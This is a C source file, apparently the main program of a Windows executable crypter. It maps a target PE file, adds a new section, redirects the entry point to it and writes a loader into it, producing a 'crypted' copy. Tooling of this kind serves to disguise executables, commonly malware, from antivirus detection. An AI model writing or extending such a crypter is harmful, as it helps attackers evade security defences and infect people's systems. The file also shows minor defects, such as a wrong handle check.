#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <Windows.h>
#include <Winnt.h>

#include "Crypt.h"

VOID die (LPCSTR s) {
	fprintf (stderr, "[!] %s error: %lu\n", s, GetLastError());
	exit (EXIT_FAILURE);
}

VOID print_debug (LPCSTR fmt, ...) {
	CHAR buf[BUFSIZ];

	strcpy (buf, "[*] ");

	va_list args;
	va_start (args, fmt);

	vsnprintf (buf + strlen (buf), sizeof (buf) - strlen (buf), fmt, args);

	fprintf (stdout, "%s\n", buf);

	va_end (args);
}

int main (int argc, char *argv[]) {
	CHAR file_path[MAX_PATH];

	print_debug ("Creating new section header");
	// declare section header
	PSECTION_HEADER my_pish = new_section_header();
	if (my_pish == NULL) {
		die ("Create new section header");
	}

	// get target file name
	GetCurrentDirectory (MAX_PATH, file_path);
	strncat (file_path, TARGET_FILE, MAX_PATH - strlen (file_path) - 1);
	
	print_debug ("Opening target file");
	// open file to crypt
	HANDLE hFile = CreateFile (file_path, GENERIC_READ | GENERIC_WRITE, 
								0, NULL, OPEN_EXISTING, 
								FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		free_section_header (my_pish);
		die ("Create file");
	}

	print_debug ("Creating target file mapping");
	// open to extract information
	// create a mapped file
	HANDLE hFileMappingObject = CreateFileMapping (hFile, NULL, PAGE_READWRITE, 
													0, 0, NULL);
	if (hFileMappingObject == NULL) {
		CloseHandle (hFile);
		free_section_header (my_pish);
		die ("Create file mapping");
	}

	print_debug ("Mapping target file view");
	// get mapped view
	LPVOID hMappedFile = MapViewOfFile (hFileMappingObject, 
										FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (hMappedFile == NULL) {
		CloseHandle (hFileMappingObject);
		CloseHandle (hFile);
		free_section_header (my_pish);
		die ("Map view of target file");
	}

	print_debug ("Adding new section");
	// add section + integrate values
	if (add_new_section (hMappedFile, my_pish) == FALSE) {
		UnmapViewOfFile (hMappedFile);
		CloseHandle (hFileMappingObject);
		CloseHandle (hFile);
		free_section_header (my_pish);
		die ("No room for new section");
	}

	print_debug ("Adjusting address of entry point");
	// redirect AEP to new section
	redirect_entry_point (hMappedFile, my_pish);

	UnmapViewOfFile (hMappedFile);
	CloseHandle (hFileMappingObject);

	print_debug ("Creating crypted file");
	PUCHAR new_file = malloc (MAX_PATH);
	if (new_file == NULL) {
		die ("Malloc new file");
	}

	GetCurrentDirectory (MAX_PATH, new_file);
	strcat (new_file, OUTPUT_FILE);

	HANDLE hNewFile = CreateFile (new_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
								FILE_ATTRIBUTE_NORMAL, NULL);
	if (hNewFile == NULL) {
		die ("Create crypted file");
	}

	print_debug ("Writing to new section");
	// write loader into new section
	if (write_to_section (hFile, hNewFile, my_pish) == FALSE) {
		die ("Write to section");
	}

	CloseHandle (hNewFile);
	free (new_file);

	CloseHandle (hFile);

	free_section_header (my_pish);

	return EXIT_SUCCESS;
}